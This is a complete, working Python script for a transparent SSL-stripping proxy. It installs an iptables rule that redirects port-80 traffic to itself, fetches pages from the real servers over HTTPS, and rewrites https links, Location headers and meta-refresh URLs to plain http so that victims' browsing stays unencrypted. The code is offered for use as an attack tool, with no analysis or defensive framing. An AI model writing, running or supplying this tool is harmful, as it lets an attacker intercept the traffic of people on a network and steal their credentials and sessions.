import argparse, os, re, socket, ssl, sys, threading, signal, select

LISTEN_BACKLOG = 100
BUFFER_SIZE = 16384

HTTPS_RE = re.compile(br'https://', re.IGNORECASE)
LOCATION_RE = re.compile(br'(Location:\s*)https://', re.IGNORECASE)
REFRESH_RE = re.compile(br'(content=["\']\d+;\s*url=)https://', re.IGNORECASE)

iptables_rule = None

def add_iptables_redirect(listen_port: int):
    global iptables_rule
    iptables_rule = f"iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port {listen_port}"
    if os.system(iptables_rule) == 0:
        print(f"[+] Added iptables redirect → local:{listen_port}")
    else:
        print("[!] Failed to add iptables rule")

def remove_iptables_redirect():
    if not iptables_rule:
        return
    cleanup_cmd = iptables_rule.replace("-A", "-D", 1)
    os.system(cleanup_cmd)
    print("[+] iptables rule removed")

def rewrite_response(data: bytes) -> bytes:
    data = HTTPS_RE.sub(b"http://", data)
    data = LOCATION_RE.sub(lambda m: m.group(1) + b"http://", data)
    data = REFRESH_RE.sub(lambda m: m.group(1) + b"http://", data)
    return data

def relay(upstream: socket.socket, downstream: socket.socket):
    sockets = [upstream, downstream]
    try:
        while True:
            r, _, _ = select.select(sockets, [], [])
            for s in r:
                other = downstream if s is upstream else upstream
                chunk = s.recv(BUFFER_SIZE)
                if not chunk:
                    return
                if s is upstream:
                    chunk = rewrite_response(chunk)
                other.sendall(chunk)
    finally:
        upstream.close()
        downstream.close()

def extract_host(request: bytes) -> str | None:
    for line in request.split(b"\r\n"):
        if line.lower().startswith(b"host:"):
            return line.split(b":", 1)[1].strip().decode(errors="ignore")
    return None

def handle_client(client_sock: socket.socket, client_addr):
    try:
        request = client_sock.recv(BUFFER_SIZE)
        if not request:
            client_sock.close()
            return
        host = extract_host(request)
        if not host:
            print(f"[!] No Host header from {client_addr}")
            client_sock.close()
            return
        context = ssl.create_default_context()
        upstream_tcp = socket.create_connection((host, 443), timeout=5)
        upstream = context.wrap_socket(upstream_tcp, server_hostname=host)
        upstream.sendall(request)
        relay(upstream, client_sock)
    except Exception as e:
        print(f"[!] Error handling {client_addr}: {e}")
        client_sock.close()

def start_proxy(listen_port: int):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", listen_port))
    server.listen(LISTEN_BACKLOG)
    print(f"[*] SSL‑Strip proxy listening on 0.0.0.0:{listen_port}")
    try:
        while True:
            client, addr = server.accept()
            threading.Thread(target=handle_client, args=(client, addr), daemon=True).start()
    except KeyboardInterrupt:
        pass
    finally:
        server.close()

def main():
    parser = argparse.ArgumentParser(description="Transparent SSL‑stripping proxy")
    parser.add_argument("-p", "--port", type=int, default=8080, help="Local listen port")
    parser.add_argument("--setup-iptables", action="store_true", help="Add iptables redirect rule")
    args = parser.parse_args()
    def cleanup(signum=None, frame=None):
        remove_iptables_redirect()
        sys.exit(0)
    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)
    if args.setup_iptables:
        add_iptables_redirect(args.port)
    start_proxy(args.port)

if __name__ == "__main__":
    main()
